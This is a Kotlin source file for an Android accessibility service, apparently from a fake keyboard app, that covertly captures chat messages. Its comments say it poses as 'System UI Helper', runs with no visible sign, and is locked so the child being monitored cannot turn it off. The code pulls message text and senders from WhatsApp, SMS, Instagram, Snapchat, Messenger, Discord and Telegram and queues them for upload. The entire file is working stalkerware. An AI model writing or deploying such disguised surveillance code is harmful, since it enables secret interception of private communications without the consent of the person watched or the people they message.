package com.safetype.keyboard

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.safetype.keyboard.data.DedupEngine
import com.safetype.keyboard.data.MessageEntity
import com.safetype.keyboard.data.MessageDatabase
import com.safetype.keyboard.scraper.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * AccessibilityService that silently scrapes visible text from chat apps.
 *
 * Appears as "System UI Helper" in Settings > Accessibility.
 * Runs invisibly — no toasts, notifications, or UI.
 *
 * Monitors: WhatsApp, Google Messages, Samsung Messages, Instagram DMs,
 * Snapchat text chats, and falls back to generic scraping for unknown apps.
 *
 * Device Owner auto-enables and locks this service so child cannot disable it.
 */
class ScreenScraperService : AccessibilityService() {

    companion object {
        private const val TAG = "ScreenScraper"
        private const val DEBOUNCE_MS = 150L
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val dedupEngine = DedupEngine()

    // Per-app scrapers
    private val scrapers: List<AppScraper> = listOf(
        WhatsAppScraper(),
        SMSScraper(),
        InstagramScraper(),
        SnapchatScraper()
    )
    private val genericScraper = GenericScraper()

    // Debounce: track last event time per package to avoid redundant scrapes
    private var lastEventTime = 0L
    private var lastPackage: String? = null

    // Packages we explicitly monitor
    private val monitoredPackages = scrapers.flatMap { it.targetPackages }.toSet() + setOf(
        "com.facebook.orca",      // Messenger
        "com.discord",            // Discord
        "org.telegram.messenger"  // Telegram
    )

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        val packageName = event.packageName?.toString() ?: return
        val eventType = event.eventType

        // Only process content/window changes
        if (eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        ) return

        // Debounce rapid events from the same package
        val now = System.currentTimeMillis()
        if (packageName == lastPackage && now - lastEventTime < DEBOUNCE_MS) return
        lastEventTime = now
        lastPackage = packageName

        // Skip our own package
        if (packageName == "com.safetype.keyboard") return

        // Get the root node
        val rootNode: AccessibilityNodeInfo = try {
            rootInActiveWindow ?: return
        } catch (e: Exception) {
            Log.w(TAG, "Failed to get root node", e)
            return
        }

        // Find the right scraper and extract messages
        serviceScope.launch {
            try {
                val messages = scrapeWithBestScraper(rootNode, packageName)
                processMessages(messages)
            } catch (e: Exception) {
                Log.e(TAG, "Scrape failed for $packageName", e)
            } finally {
                try {
                    rootNode.recycle()
                } catch (_: Exception) { }
            }
        }
    }

    private fun scrapeWithBestScraper(
        rootNode: AccessibilityNodeInfo,
        packageName: String
    ): List<ScrapedMessage> {
        // Try specific scrapers first
        for (scraper in scrapers) {
            if (packageName in scraper.targetPackages) {
                return scraper.scrape(rootNode, packageName)
            }
        }

        // For other monitored packages or any app, use generic scraper
        if (packageName in monitoredPackages) {
            return genericScraper.scrape(rootNode, packageName)
        }

        // Not a monitored package — skip
        return emptyList()
    }

    private suspend fun processMessages(messages: List<ScrapedMessage>) {
        if (messages.isEmpty()) return

        val db = MessageDatabase.getInstance(applicationContext)
        val dao = db.messageDao()

        for (msg in messages) {
            // Dedup check
            if (dedupEngine.isDuplicate(msg.text, msg.sender, msg.appSource)) {
                continue
            }

            // Insert into Room DB for later batch upload
            val entity = MessageEntity(
                text = msg.text,
                sender = msg.sender,
                direction = msg.direction.name.lowercase(),
                appSource = msg.appSource,
                sourceLayer = "accessibility",
                timestamp = msg.timestamp,
                isSent = false
            )

            try {
                dao.insert(entity)
                Log.d(TAG, "Queued: [${msg.appSource}] ${msg.text.take(40)}...")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to insert message", e)
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "Accessibility service destroyed")
    }
}
